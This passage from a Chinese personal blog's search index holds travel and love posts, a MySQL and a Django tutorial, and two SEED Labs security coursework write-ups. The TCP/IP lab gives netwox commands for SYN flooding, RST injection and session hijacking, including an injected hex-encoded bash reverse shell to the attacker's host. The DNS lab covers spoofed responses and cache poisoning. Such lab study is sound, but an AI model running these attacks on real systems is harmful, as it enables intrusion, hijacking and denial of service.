在北京的这周里，去了好几所学校，清华、北大、北航、北邮，对于帝都的学校，一直有一种敬畏感。但是，与朋友、学长学姐交流才发现，当你真正了解以后，也没有那么的神圣。这些学校确实有很多很多厉害之处，也有很多超厉害的人物，但是与我们也有很多相似之处，没有那么遥不可及。在北邮，见了很想见的学长学姐，交流甚欢。曾经不要我的北邮，听他们说来也没有想象中的那么好。虽然很遗憾，没能到帝都去读研，但是现在想来曾经给我建议的恩师让我选择了现在的学校也是没错的，至少现在也还蛮知足。在北航，见了曾经的初中老友，多年没见的我们，再次见面依然无话不聊。吐槽研究生生活，回忆初中快乐时光。在清华北大，感受不一样的氛围，恬静幽雅的校园环境，古建筑那种古朴的气息浓郁而悠远，顶尖高校特有的书香气息扑面而来。在清华园，逛到水木清华，想起才子李健，这种说不出来的崇敬油然而生。在北大未名湖畔，寻觅季羡林笔下的未名湖，在浓郁的中国风建筑里感受中国传统文化。一所大学的灵魂在于它的文化，没有文化的大学几乎没有未来，也不会培养出太多的人才，当然，清北都是有灵魂的。 闲聊时，经常和老友吐槽在北京的种种较差的体验，赶上北京难得一遇的大暴雨，空气太过潮湿，实在是不太适应这样的气候。虽然个人对于北京没有那么向往，也并不是我所理想的城市，但是，对于中国的政治、经济、文化中心，内心还是十分崇敬的。我也多次提及对帝都丰富资源的羡慕，超多的高校、听不完的讲座以及数不胜数的初创公司等等，这些对于年轻人来说这是很不错的。更多的资源意味着更多的机会，更多的可能，这也是为什么会那么多北漂的人。 匆匆到来，又匆匆离去。见证了帝都的深厚的历史文化底蕴，感受了繁华都市里充满生机与活力的氛围，也了解了北漂一族的不易。祝在这里的你们都好，愿你们在异常艰难的北漂生活中能够被温柔以待。我果然又不负众望地将这篇博客成功拖了将近一个月，不过已经写了很多了。当然，我也还有很多想要分享的，如果你有酒的话，下次当面讲故事给你听。总之，再次到访北京，果然不虚此行。北京，再会！]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[有你的样子，真好]]></title>
    <url>%2F2018%2F07%2F13%2F%E6%9C%89%E4%BD%A0%E7%9A%84%E6%A0%B7%E5%AD%90%EF%BC%8C%E7%9C%9F%E5%A5%BD%2F</url>
    <content type="text"><![CDATA[你在我身边像个小孩，单纯而善良。今后我所有的牵挂，所有的向往，都和你一样。让我们，平静渡过漫长。 我的女神， 我们的第1个100天，要说感想也还是蛮多的。这段时间，经历过开心与惊喜，也有伤心和难过，或许这就是爱情本来该有的样子。我有我的小脾气，你有你的小倔强，几乎每周我们都要讨论是不是真的爱我，也是慢慢的，我才选择去相信。有时候，我确实有些感性，一开始我就想把你紧紧抱着，就像你现在也会自私的想要让我始终就是你一个人的。这样的想法我很早就有了，所以才会因为一些事情生气。 我的认真主动，你的后知后觉，有时候让我觉得很害怕会失去。还好，现在终于有了把你紧紧抱住的感觉。暑假的短暂离别，从一开始的不适应，到后来的理解。其实，这段时间也算是是对我们的考验，可以让我们更好的去思考应该如何相处。特别是最近在看刘若英的《我敢在你怀里孤独》，我突然就对你这样性格的人有了更深刻的认识，对于如何处理独处与相处也有了新的体会。其实，了解一个人本来就是很有意思的事情，更何况是了解自己喜欢的人呢。经过这100天的了解，我也是慢慢能够理解你的一些行为，希望你也可以试着去理解我。 我们原本就是很不一样的人，我很有条理，你却很随性。但是我很喜欢这样的不一样，就像你曾经和我说，如果我找一个和我一模一样的人，那该有多无聊。确实，我们就是有太多的不一样才会有这样有意思的100天。每次翻开聊天记录，满满的都是恋爱的味道。不过，在一起的这些日子，你确实改变了我很多，无论是一些生活习惯，还是对爱情的认识。或许真的是觉得找到了对的人，我才会这样愿意去等待，去为你而改变吧。 你总说你想要最舒服的生活方式，不想有太多的束缚，不想太累，我当然也希望你可以一直这样，我也会尽量让你这样。但是，还是希望你自己能很好地去处理一些事情。我也想我可以为你做好所有的事情，我也希望我会是可以随时保护你的人，但是有些事情还是会需要你自己去做。所以，有时候还是会很担心你，毕竟有些路我已经走过，还是希望你能够意识到其中的不易，以便早做准备。总之，希望你变得更好。 你说，我的宽容，我的耐心，我的尊重让你很容易就为我沦陷，这应该是这100天里，我听过最开心的话，哈哈。你说我在爱情方面像个小孩，而我却觉得你在我身边，很多时候都像小孩，单纯而善良。其实，你的善良和天真也是我一直想要守护的东西，所以我才会对你宽容、有耐心以及尊重。虽然我依然常常扮演着学长的角色，经常教育你，甚至有时候也会因为你不听而生气。后来，甚至会有无能为力的感觉。我确实很希望能够改变你，但是你不喜欢刻意去改变，后来，我也慢慢意识到这样的改变确实会很累。所以，我也希望我们能够继续守护彼此那些不一样的东西。 莫文蔚的那首《慢慢喜欢你》很好地诠释了我们在一起的过程中你给我的感觉。你真的是一个慢热的人，就像歌词写的，慢慢喜欢你，慢慢的亲密，慢慢聊自己，慢慢和你走在一起……我们就像是这样，从你一开始所说的不习惯，到现在慢慢依赖我，爱我。我都不曾想过我们会像现在这样好，但是，我现在确实感觉很幸福，我们互相拥有，互相珍惜。 谢谢你选择与我相伴，信任我，给与我不曾有的感觉，让我有足够的力量更好地往前走。希望我们能够继续过好我们以后很多的100天，希望我们可以一起互相陪伴，度过人生的潮起潮落。我会学习成为一个好男友，希望带给你更多的幸福，给你留下很多感动的回忆。 没想到可以写这么多（公开的博客，也就没有放女神的照片啦，见谅！），又一个为我们熬的夜，很开心，哈哈。我已经想象过无数次我们以后的样子，经常想着想着就会笑。嗯，有你的样子，真好！不想谈太久太久以后的事情，我觉得，如果以后都能好好的走下去的话，我相信，很多事情也就都会是顺其自然的。 爱你的男神。]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[停更半年，再次回归]]></title>
    <url>%2F2018%2F07%2F12%2F%E5%81%9C%E6%9B%B4%E5%8D%8A%E5%B9%B4%EF%BC%8C%E5%86%8D%E6%AC%A1%E5%9B%9E%E5%BD%92%2F</url>
    <content type="text"><![CDATA[有所计划，顺其自然。 自2018年初博客停止更新，至今已有将近半年的时间，最近一直在思考，自己曾坚持几年的东西竟然丢下这么久了，想想还有些后怕。最近突然意识到这半年自己有点迷失，希望能够慢慢找回自己。时隔将近半年，重新开始写博客，确实感到有些生疏，不过，这种感觉还是那么熟悉。 先说说这半年我为什么没有坚持继续写博客吧。主要有以下几个方面的原因，一是，自己目前正处于研究生期间，每天有固定的工作（学习）时间，留给自己的时间并不多，并且由于所研究的内容涉及到一些课题组的利益，所以不太方便写成博客进行发表；二是，自己也在思考，步入研究所阶段，写的博客是不是应该更加有深度，而不再把它当作笔记本，因此，自己也在忙着充电，读一些有意义的书，学习新的技术等。三是，忙于自己人生的大事的一部分，谈恋爱。找到一个互相喜欢的人也还是蛮开心的，所以也确实花了不少时间来共度美好的时光。最近也在思考，两个人在一起应该互相支持，共同进步，而不仅仅只是玩耍。 然后，说说对于这个博客我自己的一些思考与计划。前面提到，希望写出更有深度的内容，因此，一方面，我打算介绍一些更新的技术。很老的技术我就不再打算写了，主要侧重于自己实践过的知识或者是技术，根据自己的体会做一些推荐和建议。另一方面，我会多写一些自己对生活的一些感悟，包括观后感、读后感或者是突然的感悟等等。毕竟是私人博客，所以所写的内容肯定会有一些个人的偏见，当然，我会尽可能客观的表达自己的看法。如果有不同的观点和看法，还希望看我博客的朋友能够多多包涵，也可以私下交流。 最后，感谢关注过我博客的所有人。从CSDN博客平台到Wordpress自建博客，再到现在的Github Pages，累计浏览人数已经超过20万。虽然现在的Github Pages没有CSDN那么大的流量，但是还是更喜欢现在的方式。因为，相比于CSDN，私人博客不仅仅可以写技术，也可以谈谈生活。在这个过程中，我其实也收获了很多，认识了很多素昧平生的人，与他们交流我也学到了很多新的知识。即使CSDN的博客已经很久没有更新了，还是有人给我发邮件请教问题或者是表达感谢，这些小事给我带来的成就感是源源不断的 。我想，我还是会尽力写下去，也希望得到更多人的认可与支持。谢谢你们！]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu16.04中Mysql 5.7 安装配置]]></title>
    <url>%2F2018%2F01%2F26%2FUbuntu-16-04%E4%B8%ADMysql-5-7-%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[记录在Ubuntu 16.04安装Mysql 5.7时遇到的一些问题。 Mysql安装 使用如下命令进行安装： 1sudo apt-get install mysql-server mysql-client 检查安装是否成功以及MySQL是否运行： 1sudo netstat -tap | grep mysql 启动/关闭/重启 Mysql： 123sudo service mysql start # 启动sudo service mysql stop # 关闭sudo service mysql restart # 重启 通过以上步骤基本已经完成安装，但是我们也应该注意到，安装过程中都没有要求填写用户名和密码。终端输入mysql -u root -p之后，要求输入密码，但是我们并没有设置密码，随便输入之后，提示如下错误： 1ERROR 1045 (28000): Access denied for user &apos;root&apos;@&apos;localhost&apos; (using password: YES) 查找资料发现5.7版本与之前的版本不太一致，需要一些特殊的操作，具体请看下一节。 Mysql 5.7 root无法登录的问题 在这个文件里面有着MySQL默认的用户名和用户密码，用户名默认的不是root，而是debian-sys-maint，如下所示： 1&gt; cat /etc/mysql/debian.cnf 使用该账号进行登录： 1&gt; mysql -u debian-sys-maint -p 查询已有的数据库 1&gt; show databases; 操作mysql数据库： 1&gt; use mysql 查看mysql数据库中有哪些表： 1&gt; show tables; 可以看到有一个user表，我们查询user表中的用户和密码： 1select user,authentication_string from user 注意：这里不能查询password字段（如下命令），因为在新版本中password字段已经被authentication_string字段替换。 1&gt; select user,password from user 更新user表中root用户的密码： 1&gt; update user set authentication_string=password(&apos;新密码&apos;) where user=&apos;root&apos;; 重新加载权限表，一定要进行这一步，否则更新不会生效： 1flush privileges 最后，即可使用root用户以及我们设置的密码进行登录： 1&gt; mysql -u root -p 注意：由于用户debian-sys-maint的信息可以从文件中查找到，因此最好将其密码也改一下。]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Mysql</tag>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python Django学习笔记（一）]]></title>
    <url>%2F2018%2F01%2F13%2FPython-Django%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[Django是一个Web框架，它采用MTV（Model-Template-View）模型组织，相比其他框架，Django充分利用Python特点，开发效率更高。 环境配置这篇博客基于：Python3.6 + PyCharm社区版 + Windows7命令行 使用pip安装django： 1&gt; pip install django Django开发简单示例 创建工程：>django-admin startproject mysite 修改工程： 2.1 创建一个具体应用（app） 2.2 修改应用的views.py：对URL的具体响应功能 2.3 修改URL路由：指定URL与响应之间的关系 运行测试工程：>python manage.py runserver Django工程创建工程打开cmd，使用django-admin工具创建Django工程： 1&gt; django-admin startproject mysite 目录结构1234567.├── manage.py└── mysite ├── __init__.py ├── settings.py ├── urls.py └── wsgi.py manage.py 一个实用的命令行工具，实现以各种方式与该Django项目进行交互。 __init__.py 让 Python 把该目录当成一个开发包 (即一组模块)所需的文件。 这是一个空文件，一般你不需要修改它。 settings.py 部署和配置整个工程的配置文件，包含Django的设置、配置文件，比如DEBUG的开关，静态文件的位置等等。 urls.py 可视其为Django网站的目录，URL路由的声明文件（路由文件），链接入口，关联到对应的views.py中的一个函数（或者称作generic类），访问的链接就对应一个函数。 wsgi.py 基于WSGI的Web服务器的配置文件。 django-admindjango-admin是一个Django框架全局的管理工具，它具有以下功能： 建立并管理Django工程 建立并管理Django工程使用的数据库 控制调试或日志信息 运行并维护Django工程 使用示例： 1&gt; django-admin &lt;command&gt; [options] 查看更多命令可使用帮助： 1&gt; django-admin -help manage.py与django-admin类似，但manage.py仅针对当前项目。 查看更多命令可使用帮助： 1&gt;python manage.py help 使用示例： 123&gt; python manage.py &lt;command&gt; [options]or&gt; python –m django &lt;command&gt; [options] 运行工程1&gt; python manage.py runserver 打开浏览器，输入 http://127.0.0.1:8080 即可看到Django默认的页面。 Django应用工程对应于一个网站，是配置和应用的集合，应用对应于特定功能，是具体功能的载体，配置和功能分离是高度模块化的体现。 创建应用一般一个项目有多个app，当然通用的app也可以在多个项目中使用。 1234&gt; cd mysite&gt; django-admin startapp appor&gt; python manage.py startapp app Django应用目录结构12345678910.├── app│ ├── admin.py│ ├── apps.py│ ├── __init__.py│ ├── migrations│ │ └── __init__.py│ ├── models.py│ ├── tests.py│ └── views.py admin.py 后台文件，可以用少量的代码就拥有一个强大的后台。 apps.py App的配置文件。 __init__.py 让 Python 把该目录当成一个开发包所需的文件。 views.py 包含对某个HTTP请求(url)的响应，用于处理用户发出的请求，从 urls.py 中对应而来，通过渲染 templates 中的网页可以为用户显示页面内容，比如登录后的用户名，用户请求的数据，通过其输出到页面。 models.py 与数据库操作相关，存入或读取数据时使用。当不使用数据库的时候，也可以当做一般的类封装文件，存储各种类的定义。 修改应用 修改应用的views.py views.py中包含对某个HTTP请求(url)的响应，在其中添加以下代码： 12345from django.http import HttpResponse# 设置处理请求的函数def hello(request): return HttpResponse(&apos;Hello, Welcome!&apos;) 修改工程的url.py中的URL路由 在urls.py中指定URL与处理函数之间的路径关系，在文件中添加指定路由： 12345678from django.contrib import adminfrom django.urls import pathfrom app import views # 添加app的viewsurlpatterns = [ path(&apos;admin/&apos;, admin.site.urls), path(&apos;index/&apos;, views.hello) # 添加路由条目] 注：Pycharm导入自己写的包时可能会报错，这时候需要在项目目录上右键选择Mark Directory as，然后选择Source Root。 运行测试工程运行Django： 1&gt; python manage.py runserver 使用浏览器访问以下地址： http://127.0.0.1:8000/index/ 可以看到已经正常显示了：Hello, Welcome!]]></content>
      <categories>
        <category>Programming language</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Django</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Seed Labs: TCP/IP Attack Lab]]></title>
    <url>%2F2018%2F01%2F12%2FSeed-Labs-TCP-IP-Attack-Lab%2F</url>
    <content type="text"><![CDATA[网络与计算机安全课程实验（二），TCP/IP攻击。 实验原理与目的 TCP/IP协议从开始设计时候并没有考虑到现在网络上如此多的威胁，由此导致了许多形形色色的攻击方法。本次实验涉及了TCP/IP攻击的三种基本类型，（1）SYN洪泛攻击，（2）TCP RST攻击，（3）TCP会话劫持攻击。希望通过本次实验了解TCP/IP攻击的原理，通过实际操作掌握基本的攻击方法，学会如何防范此类攻击。 实验配置 基本配置与上一个实验：Local DNS Attack Lab基本一致。按照实验指导手册，配置3台虚拟机，1台作为DNS服务器，1台作为用户机，另1台作为攻击者，3台机器通过设置NAT网络来实现网络互访。 实验资料下载地址： http://www.cis.syr.edu/~wedu/seed/Labs_12.04/Networking/TCPIP/ 启用telnet服务器 对于本实验，实验要求启用ftp和telnet服务器，但是其实在后续的实验中只用到了telnet。为了安全起见，Ubuntu系统中安装的这些服务通常是默认禁用的，所以需要以root用户身份运行以下命令来启用： 12$ sudo service vsftpd start$ sudo service openbsd-inetd start 实验过程SYN 洪泛攻击 SYN 洪泛是DoS攻击的一种形式，攻击者向受害者的TCP端口发送多个SYN请求，但是攻击者无意完成三次握手过程。攻击者要么使用欺骗性的IP地址，要么不要继续这个过程。通过这种攻击，攻击者可以淹没用于半开连接的受害者队列，即完成SYN，SYN-ACK但尚未得到最终ACK的连接。当这个队列已满时，受害者不能再进行连接。 队列的大小有一个系统范围的设置。在Linux中，我们可以使用以下命令检查设置：1$ sysctl -q net.ipv4.tcp_max_syn_backlog 我们可以使用命令“netstat -na”来检查队列的使用情况，即与监听端口关联的半开连接的数量。这种连接的状态是SYN-RECV。如果三次握手完成，连接的状态将建立。 Netwox编号为76的工具提供了SYN 洪泛攻击的基本功能，输入“netwox 76 –help”可以获取如下帮助信息。 首先在用户机上使用telnet 192.168.0.10命令测试telnet连接是否可用，验证可以成功登陆后即退出，然后攻击者开始使用如下命令发起攻击： 1$ sudo netwox 76 --dst-ip 192.168.0.10 --dst-port 23 然后，用户机再次通过telnet连接到服务器，此时发现依然可以连接，按照实验指导手册所说，我们需要检查机器是否已经开启SYN cookie机制，SYN cookie是抵御SYN洪泛攻击的防御机制。我们可以使用sysctl命令查看、打开和关闭SYN cookie机制，使用如下命令查看SYN cookie机制的设置情况： 1$ sysctl -a | grep cookie 可以看到默认情况下， SYN cookie机制是启用的，所以先将其关闭后再尝试攻击，使用如下命令将其关闭： 1$ sysctl -w net.ipv4.tcp_syncookies=0 此时，再次发起攻击，并尝试再次使用telnet连接到服务器，发现已经无法连接到服务器了，如下： 当然，你也可以通过wireshark抓包来查看攻击者发送的数据包。实验完成后，再使用如下命令将SYN cookie机制打开，以防止SYN洪泛攻击。 1$ sysctl -w net.ipv4.tcp_syncookies=1 TCP RST攻击telnet和ssh连接 RST表示复位，用来异常的关闭连接，在TCP的设计中它是不可或缺的。发送RST包关闭连接时，不必等缓冲区的包都发出去，直接就丢弃缓存区的包发送RST包。而接收端收到RST包后，也不必发送ACK包来确认。TCP RST攻击可以终止两个受害者之间建立的TCP连接。例如，如果两个用户A和B之间建立了Telnet连接（TCP），则攻击者可以将A到B的RST数据包进行欺骗，从而破坏现有的连接。为了在这次攻击中取得成功，攻击者需要正确构造TCP RST数据包。Netwox编号为78的工具提供了RST攻击的基本功能，输入“netwox 78 –help”可以获取如下帮助信息。 在用户机上使用telnet命令连接到服务器，登录成功以后，攻击者发起RST攻击，通过netwox 78号工具伪造RST包发送给服务器，命令如下： 1netwox 78 –i 1921.68.0.10 命令运行后悔使得用户机与服务器的telnet连接中断，攻击效果如下图： 在用户机上使用ssh命令连接到服务器，登录成功以后，攻击者发起RST攻击，通过netwox 78号工具伪造RST包发送给服务器，使得用户机与服务器的SSH连接中断，实验效果如下图： TCP RST攻击视频流应用程序 实验原理与任务2相同。TCP RST攻击终会止两个受害者之间建立的TCP连接。在用户机上使用浏览器访问优酷的视频，攻击者向用户发起RST攻击，再刷新浏览器页面时即显示，为了在这次攻击中取得成功，攻击者需要正确构造TCP RST数据包。 Netwox编号为78的工具提供了RST攻击的基本功能攻击命令，通过netwox 78号工具伪造RST包发送给服务器，命令如下： 1netwox 78 –i 1921.68.0.100 攻击效果如下图，正常观看视频，发起攻击再刷新页面后TCP连接断开，页面崩溃。 TCP会话劫持 开启wireshark，并设置过滤器–filter telnet，然后开始监控局域网内的流量。用户开始使用telnet连接到服务器，分析telnet连接建立时发送的数据包，然后根据其特征伪造相应的数据包来劫持会话。 Netwox编号为40的工具提供了SYN 洪泛攻击的基本功能，输入“netwox 40 –help”可以获取如下帮助信息。 使用netwox的40号工具，根据抓包数据的TCP源端口目的端口填写tcp-src和tcp-dst，根据IP包的源地址目的地址填写ip4-src和ip4-dst，根据用户机发送给服务器的最后一个数据包的Next sequence nuber字段填写tcp-seqnum，根据服务器发送给用户机的最后一个数据包的Acknowledgement number字段填写tcp-acknum，根据IP包的TTL字段填写ip4-ttl，根据IP包的协议字段填写ip4-protocol ，然后根据需要填写tcp-data字段。加入我们发送ls命令到服务器来查看该目录下有什么文件，将ls转换成16进制并加上\r的16进制数，生成我们的命令如下： 1sudo netwox 40 --ip4-offsetfrag 0 --ip4-ttl 64 --ip4-protocol 6 --ip4-src 192.168.0.100 --ip4-dst 192.168.0.10 --tcp-src 59714 --tcp-dst 23 --tcp-seqnum 3089814629 --tcp-acknum 1471714290 --tcp-ack --tcp-psh --tcp-window 128 --tcp-data &quot;6c730d00&quot; 通过wireshark抓包可以看到命令已经发出，效果如下： 紧接着，服务器会将该命令的执行结果发送出来，我们同样可以通过抓包查看，如下所示，可以看到ls命令的执行结果，即显示该目录下所有文件： 使用TCP会话劫持创建反向Shell 设置后门的一个典型方法是从受害者机器运行一个反向外壳，以使外壳访问受害者机器。反向shell是在远程机器上运行的一个shell进程，连接到攻击者的机器。攻击者一旦遇到危险，就可以方便地访问远程机器。 netcat程序允许我们指定一个端口号，并可以监听该端口上的连接。我们可以在攻击者机器上，使用如下命令netcat监听端口9090上的连接： 1nc –l 9090 -v “/bin/bash -i&gt; /dev/tcp/10.0.2.4/9090 0 &lt;＆1 2&gt;＆1”会启动一个bash shell，其输入来自tcp连接，其标准错误输出将被重定向到相同的tcp连接。将该命令转换成16进制，并在最后添加回车的16进制代码，即0x0d00。 然后通过上面3.4的会话劫持将这个命令发送到服务器，命令如下： 1sudo netwox 40 --ip4-offsetfrag 0 --ip4-ttl 64 --ip4-protocol 6 --ip4-src 192.168.0.100 --ip4-dst 192.168.0.10 --tcp-src 53700 --tcp-dst 23 --tcp-seqnum 3862965514 --tcp-acknum 3719047389 --tcp-window 128 --tcp-urgptr 0 --tcp-data &quot;2F62696E2F62617368202D69203E202F6465762F7463702F3139322E3136382E302E3230302F3930393020303C263120323E26310d00&quot; 通过wireshark抓包可以看到数据包已经构造成功，并且发送到服务器。 由于攻击者一直在监听9090端口，服务器一旦接收到这个命令就会向攻击者建立连接，从而拿到服务器的shell，如下图所示netstat的输出显示已建立的连接。]]></content>
      <categories>
        <category>Network</category>
        <category>Network security</category>
      </categories>
      <tags>
        <tag>Seed Labs</tag>
        <tag>TCP/IP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Seed Labs: Local DNS Attack Lab]]></title>
    <url>%2F2018%2F01%2F11%2FSeed-Labs-Local-DNS-Attack-Lab%2F</url>
    <content type="text"><![CDATA[网络与计算机安全课程的实验，使用的是美国雪城大学的开放实验平台：Seed Project。 实验原理与目的 DNS（域名系统）是因特网上作为域名和IP地址相互映射的一个分布式数据库，能够使用户更方便地访问互联网，而不用去记住能够被机器直接读取的IP数串。本次实验涉及三种DNS攻击类型，分别是（1）修改用户机器中的hosts文件，从而实现DNS攻击（2）DNS欺骗，攻击者冒充域名服务器向发送DNS查询的机器发送欺骗DNS响应。（3）缓存污染，利用控制DNS缓存服务器，把原本准备访问某网站的用户在不知不觉中带到黑客指向的其他网站上。实验目的是了解上述3种DNS攻击的原理，以及DNS攻击是如何实现的，然后学会防范这样的攻击。 实验配置 按照实验指导手册，从SeedProject的网站上下载Ubuntu12.04的镜像，它已经帮我们装好了实验必须的环境以及一些需要用到的软件。该系统默认的用户名是seed，密码是dees。 实验资料下载地址： http://www.cis.syr.edu/~wedu/seed/Labs_12.04/Networking/DNS_Local/ 然后，配置3台虚拟机，1台作为DNS服务器，1台作为用户机，另1台作为攻击者，3台机器通过设置NAT网络来实现网络互访。一般情况下，可直接复制虚拟机镜像生成三台虚拟机，不过有可能会出错。另外，3台虚拟机同时打开需要较大的内存，主机内存4G的会很卡，8G的完全没问题。实验示意图如下： Vmware配置 SeedProject提供的是VirtualBox，但是在这里不建议使用，开源的还是会遇到一些莫名其妙的问题，浪费很多时间在虚拟机环境的配置上不划算。我们应该聚焦实验，所以选择更方便更简单的VMware。 点击菜单栏-》编辑-》编辑虚拟网络，将下面的子网IP修改成192.168.0.0，子网掩码设置成255.255.255.0，找到VMnet8 NAT，编辑它，将网关修改成192.168.0.2，保存即可。 为方便操作经常需要在虚拟机和主机之间复制内容，所以需要安装Wmvare Tools。点击顶部菜单栏的虚拟机，选择重新安装VMware Tools，将打开的VMware文件复制到桌面上并解压，然后打开终端，使用命令进行安装： 12$ cd /home/你的用户名/Desktop/VMwareTools版本号.../$ ./vmware-install.pl 然后一步步安装说明进行操作即可，安装完成后可能需要重启虚拟机。 DNS服务器配置 IP和DNS基本配置： IP地址：192.168.0.10 子网掩码：255.255.255.0 网关：192.168.0.2 DNS服务器：114.114.114.114 （1）在DNS服务器上安装BIND9，BIND是一个开源的DNS服务器程序。 12$ sudo apt-get update$ sudo apt-get install bind9 （2）创建named.conf.options文件。DNS服务器需要读取/etc/bind/named.conf配置文件才能启动。这个配置文件通常包含一个叫/etc/bind/named.conf.options的选项文件，我们添加以下内容用于后续的DNS缓存污染实验： 123options &#123;dump-file &quot;/var/cache/bind/dump.db&quot;;&#125;; 文件/var/cache/bind/dump.db用于转储DNS服务器的缓存。假定我们在服务器中拥有一个域名： example.com，因此我们需要配置关于该域名的一些信息。为避免输入所带来的错误，它建议我们从SeedProject网站下载相应的文件放置到/etc/bind/目录下。 Zone file for domain example.com: /var/cache/bind/example.com.db Zone file for DNS reverse lookup: /var/cache/bind/192.168.0 （3）启动DNS服务器。 上述步骤完成后，我们的DNS服务器基本就配置完成了，然后我们使用如下命令将其启动： 123$ sudo /etc/init.d/bind9 restartor$ sudo service bind9 restart 用户机配置 IP和DNS基本配置： IP地址：192.168.0.100 子网掩码：255.255.255.0 网关：192.168.0.2 DNS服务器：192.168.0.10 攻击者配置 IP和DNS基本配置： IP地址：192.168.0.200 子网掩码：255.255.255.0 网关：192.168.0.2 DNS服务器：114.114.114.114 实验过程修改host文件的攻击 该攻击实验假定我们已经获取了受害者机器的账号密码，因此，我们在攻击者机器上通过ssh连接到用户机器，然后修改其/etc/hosts文件，添加如下一行： 11.2.3.4 www.example.com 然后使用ping 得到如下图的结果，可以看到该域名对应的IP地址已经变更为1.2.3.4。因为如果用户机器中的hosts文件中存在该域名的条目，那么将直接解析该域名为条目中对应的IP地址，而不询问任何DNS服务器。攻击完成后，用户再使用ping时即可看到www。Example的地址已经变成1.2.3.4，如下图： 注意，这里使用nslookup进行查看时是不能看到攻击效果的，因为nslookup不会先查本地的hosts文件，而是直接向DNS服务器发送一个DNS查询请求。 欺骗DNS响应 当用户在Web浏览器中输入网站域名时，用户计算机将向DNS服务器发出DNS请求以解析IP地址的主机名称。位于同一局域网的攻击者可以监听到这个DNS请求，然后在DNS服务器返回DNS响应之前伪造一个虚假的DNS响应发送给DNS请求者。当然，DNS响应需要满足以下要求才会被DNS请求者接受： 源IP地址必须与DNS服务器的IP地址相匹配。 目标IP地址必须与用户机器的IP地址相匹配。 源端口号（UDP端口）必须与DNS请求发送到的端口号（通常为端口53）相匹配。 目标端口号必须与发送DNS请求的端口号相匹配。 UDP校验和必须正确计算。 交易ID必须与DNS请求中的交易ID匹配。 响应的问题部分中的域名必须与请求的问题部分中的域名相匹配。 响应部分中的域名必须与DNS请求的问题部分中的域名匹配。 用户的计算机必须收到攻击者的DNS答复，才能收到合法的DNS响应。 Netwox工具105提供了一个实用程序来进行这样的嗅探和响应。攻击者使用Netwox工具来监听来自用户机的数据包，并生成一个虚假的DNS响应包给DNS请求者，即用户机。实验原理示意图如下： Netwox命令如下： 1sudo netwox 105 --hostname &quot;www.example.com&quot; --hostnameip 192.168.0.200 --authns &quot;ns.example.com&quot; --authnsip 192.168.0.200 --filter &quot;src host 192.168.0.100&quot; 配置好以后开始监听，同时，打开wireshark以便后续分析攻击结果，当监听到DNS请求时，可以在窗口看到生成的DNS响应信息，如下图： 同时，在客户机也可以看到查到的地址已经变成了攻击者的IP地址，证明攻击成功。如下图： 查看wireshark的抓包信息，可以看到我们通过生成的欺骗DNS响应的内容如下，完全符合要求，所以会被DNS请求者接收，从而实现DNS欺骗。 DNS服务器缓存污染 上面的DNS欺骗攻击在每次用户的机器发出www.example.com的DNS查询，攻击者的机器都必须发出一个欺骗性的DNS响应，这样效率很低，为了达到持久的效果，我们可以进行针对DNS服务器进行攻击。 当一个DNS服务器接收到一个查询时，如果它可以解析则直接解析并响应，当主机名不在它的域中，它将要求其他的DNS服务器去解析主机名。当其他的DNS服务器将解析结果返回给该服务器后，它将把解析结果存储在缓存中，所以下一次不需要询问其他的DNS服务器。如果攻击者可以伪造来自其他DNS服务器的响应，那么该DNS服务器会接手伪造的DNS响应，并在一定时间内将欺骗响应保留在其缓存中。下一次，当用户的机器想要解析相同的主机名时，该DNS服务器会使用缓存中的欺骗性响应来回复。这样，攻击者只需要欺骗一次，并且影响将持续到缓存的信息到期。攻击示意图如下： 为避免我们要攻击的DNS服务器已经有缓存，攻击之前，我们要确保DNS服务器的缓存为空，可以使用以下命令刷新缓存： 1$ sudo rndc flush 攻击者使用Netwox工具来监听来自DNS服务器机的数据包，然后生成一个假的DNS响应给我们的DNS服务器。Netwox的命令如下： 1sudo netwox 105 --hostname &quot;www.fanzhenyu.me&quot; --hostnameip 192.168.0.200 --authns &quot;ns.fanzhenyu.me&quot; --authnsip 192.168.0.200 --ttl 600 --filter &quot;src host 192.168.0.10&quot; --spoofip &quot;raw&quot; 然后，在用户机使用如下命令发起DNS查询请求： 1$ nslookup www.fanzhenyu.me 攻击结果如下图，与没有攻击对比，缓存污染后DNS请求的响应已经是被污染的IP地址： 同时，可以使用如下命令转储和查看DNS服务器的缓存， 12$ sudo rndc dumpdb -cache $ sudo cat /var/cache/bind/dump.db 结果如下图，可以看到缓存已被污染。]]></content>
      <categories>
        <category>Network</category>
        <category>Network security</category>
      </categories>
      <tags>
        <tag>Seed Labs</tag>
        <tag>DNS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2018-预见不一样的自己]]></title>
    <url>%2F2018%2F01%2F01%2F2018-%E9%A2%84%E8%A7%81%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84%E8%87%AA%E5%B7%B1%2F</url>
